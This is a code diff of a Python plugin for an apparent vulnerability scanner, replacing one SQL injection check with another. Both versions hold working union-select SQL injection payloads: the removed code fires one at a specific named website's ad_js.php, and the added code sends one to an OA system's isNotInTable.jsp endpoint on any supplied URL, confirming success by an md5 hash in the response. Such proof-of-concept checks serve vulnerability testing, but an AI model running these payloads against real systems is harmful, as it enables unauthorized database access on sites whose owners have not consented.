@@ -4,18 +4,30 @@
 # team   : "gogobirds"
 
 from plugins.init import register_plugin, pluginmap
-import urllib2
+from pprint import pprint
+from libs.utils import http
 
 
-@register_plugin("test")
-def func():
-    payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
-    verify_url = "http://www.dw-ids.com/plus/" + payload
-    req = urllib2.Request(verify_url)
-    content = urllib2.urlopen(req).read()
-    print content
-    if '63e1f04640e83605c1d177544a5a0488' in content:
-        print "True"
+class TPlugin(object):
+    info = {
+        'app_name': "test",
+        'version': "0.1",
+        'type': "test",
+        'tag': ["test"],
+        'desc': "test is test",
+    }
+
+    @staticmethod
+    @register_plugin("test")
+    def func(args, info=info):
+        pprint(info)
+        payload = '''/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(3.1415)#'''
+        verify_url = args.url + payload
+        res = http.request(verify_url)
+        if res.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in res.content:
+            args.result = "access"
+        return args
+
 
 if __name__ == "__main__":
     pluginmap["test"]()
